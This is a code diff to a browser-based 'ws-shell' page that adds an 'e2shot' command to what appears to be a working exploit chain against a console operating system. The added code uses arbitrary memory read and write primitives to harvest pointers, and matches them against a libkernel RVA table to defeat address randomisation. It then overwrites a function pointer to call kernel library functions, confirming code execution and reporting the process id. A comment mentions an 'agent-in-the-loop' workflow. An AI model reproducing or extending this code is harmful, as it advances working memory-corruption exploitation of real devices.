@@ -1199,6 +1199,7 @@
 <body>
 <div id="verdict" style="position:sticky;top:0;z-index:9;font:700 15px monospace;padding:.5rem;background:#fff4d6;color:#5a4300;border-bottom:2px solid #d7b34a">SHELL: PIPELINE RUNNING</div>
 <pre id="out">ws-shell v1</pre>
+<script src="rvas.js"></script>
 <script>
 'use strict';
 var WS_SHELL=true;
@@ -5092,6 +5093,109 @@ function _startWsShell(){
         var vfyS2=(S.scopeSlot&&S.scopeOrig)?(S.absRead(S.scopeSlot,8)[0]===S.scopeOrig):true;
         reply.verified=(vfyC2===origFn)&&vfyS2;
         reply.value=result;
+        break;
+      }
+
+      case 'e2shot':{
+        /* THE ONE-COMMAND E2 ATTEMPT (the session-fuse fix): the watchdog
+         * kills sessions at 3-6min; the agent-in-the-loop ladder (info ->
+         * ptrscan -> offline match -> callret x2, each a CLI round trip plus
+         * analysis time) never fit inside the fuse. This runs the WHOLE
+         * campaign in-page: harvest -> match vs window.E2_RVAS (the 13.60
+         * libkernel table, layout-stable on 14.10) -> verifier ladder
+         * (lk+0x1200 sceKernelGetCurrentCpu -> 0..7) -> E2 (lk+0x1B860
+         * getpid wrapper -> the pid). Every stage beacons so a mid-ladder
+         * death leaves the full trail in shell-beacons.log.
+         * msg.skip: comma-separated failed bases to exclude (hex). */
+        if(!S.neEntry||!S.batt){reply.err='No NE target';break;}
+        if(!S.BASE){reply.err='No BASE';break;}
+        if(typeof E2_RVAS==='undefined'){reply.err='rvas.js not loaded';break;}
+        var elog=[];
+        function EL(s){elog.push(s);try{bs('E2SHOT-'+s);}catch(e){}}
+        /* ---- stage 1: harvest the data band [BASE+0x7000000, BASE+0x7400000) ---- */
+        var hStart=S.BASE+0x7000000n,hLen=0x400000;
+        var vals=[],seenE={};
+        for(var off=0;off<hLen;off+=0x4000){
+          var words;
+          try{words=S.absRead(hStart+BigInt(off),0x4000);}catch(e){break;}
+          for(var wi=0;wi<words.length;wi++){
+            var v=words[wi];
+            if(v>=0x800000000n&&v<S.BASE&&!seenE[v]){seenE[v]=1;vals.push(v);if(vals.length>=256)break;}
+          }
+          if(vals.length>=256)break;
+        }
+        EL('harvest n='+vals.length);
+        /* ---- stage 2: match against the RVA table ---- */
+        var skip={};
+        if(msg.skip){String(msg.skip).split(',').forEach(function(t){var tt=t.trim();if(tt){try{skip[BigInt(tt)]=1;}catch(e){}}});}
+        var cand={};
+        for(var vi=0;vi<vals.length;vi++){
+          var P=vals[vi];
+          var pl=Number(P&0x3fffn);
+          for(var ri=0;ri<E2_RVAS.length;ri++){
+            var R=E2_RVAS[ri];
+            if((R&0x3fff)===pl){
+              var B=P-BigInt(R);
+              if(B<0x800000000n||B>0x900000000n)continue;
+              if(skip[B])continue;
+              /* cluster sanity: no harvested pointer in [B+1, B+0x1000) -
+               * the lowest text RVA of a module is >= 0x1000 (ELF header
+               * first); kills the one-page-high decoys (session 12) */
+              var bad=false;
+              for(var kj=0;kj<vals.length;kj++){var q=vals[kj];if(q>B&&q<B+0x1000n){bad=true;break;}}
+              if(bad)continue;
+              var k=B.toString(16);
+              cand[k]=cand[k]||{B:B,pairs:0,wden:0,demo:[]};
+              cand[k].pairs++;
+              if(cand[k].demo.length<6)cand[k].demo.push('P=0x'+P.toString(16)+' R=0x'+R.toString(16));
+            }
+          }
+        }
+        /* wrapper-region density: harvested pointers in [B+0x1A000, B+0x1E000) */
+        var clist=Object.keys(cand).map(function(k){return cand[k];});
+        for(var ci=0;ci<clist.length;ci++){
+          var B2=clist[ci].B;
+          for(var pj=0;pj<vals.length;pj++){
+            var d=vals[pj]-B2;
+            if(d>=0x1A000n&&d<0x1E000n)clist[ci].wden++;
+          }
+        }
+        clist.sort(function(a,b){return (b.pairs*1000+b.wden)-(a.pairs*1000+a.wden);});
+        EL('candidates n='+clist.length+(clist.length?' top=0x'+clist[0].B.toString(16)+' pairs='+clist[0].pairs+' wden='+clist[0].wden:''));
+        if(!clist.length){reply.log=elog;reply.err='no candidates';break;}
+        /* ---- stage 3: verifier ladder ---- */
+        function e2call(t){
+          if(S.scopeSlot&&S.fakeScope&&S.scopeOrig)S.absWrite(S.scopeSlot,S.fakeScope);
+          var origFn=S.absRead(S.neEntry.addr+0x28n,8)[0];
+          S.absWrite(S.neEntry.addr+0x28n,t);
+          var r;
+          try{r=String(Math.round(-5.7));}catch(e){r='THREW';}
+          S.absWrite(S.neEntry.addr+0x28n,origFn);
+          if(S.scopeSlot&&S.scopeOrig)S.absWrite(S.scopeSlot,S.scopeOrig);
+          return r;
+        }
+        var lkBase=null,cpuRet=null;
+        var maxC=parseInt(msg.maxcand)||4;
+        for(var ti=0;ti<clist.length&&ti<maxC;ti++){
+          var B3=clist[ti].B;
+          EL('try 0x'+B3.toString(16)+' (pairs='+clist[ti].pairs+' wden='+clist[ti].wden+')');
+          var r3=e2call(B3+BigInt(E2_LK.getCurrentCpu));
+          EL('cpu call -> '+r3);
+          var n3=Number(r3);
+          if(isFinite(n3)&&n3>=0&&n3<=7&&Math.floor(n3)===n3){lkBase=B3;cpuRet=n3;break;}
+        }
+        if(lkBase===null){reply.log=elog;reply.err='no candidate verified';break;}
+        /* ---- stage 4: E2 - the getpid wrapper ---- */
+        EL('lk_base=0x'+lkBase.toString(16)+' CONFIRMED cpu='+cpuRet);
+        var pid=e2call(lkBase+BigInt(E2_LK.getpidWrapper));
+        EL('getpid -> '+pid);
+        reply.lkbase='0x'+lkBase.toString(16);
+        reply.cpu=cpuRet;
+        reply.pid=pid;
+        reply.pidn=Number(pid);
+        reply.cands=clist.slice(0,8).map(function(c){return {base:'0x'+c.B.toString(16),pairs:c.pairs,wden:c.wden,demo:c.demo};});
+        reply.log=elog;
+        try{bs('E2SHOT-COMPLETE lk=0x'+lkBase.toString(16)+' cpu='+cpuRet+' pid='+pid);}catch(e){}
         break;
       }
 
